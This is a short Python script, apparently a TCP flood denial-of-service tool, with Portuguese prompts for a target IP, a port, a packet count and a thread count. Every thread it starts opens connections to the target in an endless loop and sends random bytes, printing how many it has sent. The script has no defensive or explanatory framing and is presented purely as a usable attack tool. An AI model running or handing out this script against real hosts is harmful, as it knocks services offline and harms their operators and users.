import socket
import random
import threading

ip = str(input('[»] Alvo: '))
porta = int(input('[»] Porta: '))
pacote = int(input('[»] Pacote/s: '))
thread = int(input('[»] Threads: '))

def iniciar():
    n1 = random._urandom(10)
    n2 = int(0)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, porta))
            s.send(n1)
            for i in range(pacote):
                s.send(n1)
            n2 += 1
            print(f'Alvo: {ip} | Enviados: {n2}')
        except:
            s.close()
            print('Finalizado')


for x in range(thread):
    thred = threading.Thread(target=iniciar)
    thred.start()
